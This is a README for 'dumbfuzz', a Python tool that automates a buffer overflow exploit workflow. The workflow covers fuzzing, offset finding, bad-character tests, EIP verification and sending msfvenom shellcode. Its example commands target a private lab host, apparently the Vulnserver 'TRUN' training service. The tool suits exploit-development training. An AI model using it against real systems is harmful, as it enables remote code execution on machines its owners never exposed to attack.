# dumbfuzz

A dumb buffer overflow fuzzing script that integrates fuzzing, finding offset, bad character testing, verifying EIP, and sending shellcode:
- Integrate `metasploit-framework/tools/exploit/pattern_create.rb -l & -q` for locating offset
- You can directly copy & paste `msfvenom`'s BoF shellcode into a `.txt` file and load it up (Yeap, direct output including words like `unsigned char` and quotes)
- Built-in Little Endian conversion for EIP values so you don't have to calculate manually

## Fuzz

```python
python .\main.py --target 192.168.217.133 --port 9999 --prefix "TRUN /.:/"  --mode fuzz
```

## Offset + EIP

```python
python .\main.py --target 192.168.217.133 --port 9999 --prefix "TRUN /.:/"  --mode offset --length 2400
```

## Bad Character Tests

```python
python .\main.py --target 192.168.217.133 --port 9999 --prefix "TRUN /.:/"  --mode badchar --length 2003
```

## Verify EIP offset

```python
python .\main.py --target 192.168.217.133 --port 9999 --prefix "TRUN /.:/"  --mode verify --length 2003
```

## Shellcode

```python
python .\main.py --target 192.168.217.133 --port 9999 --prefix "TRUN /.:/"  --mode shellcode --length 2003 --shell_file shell.txt --eip 625011af
```
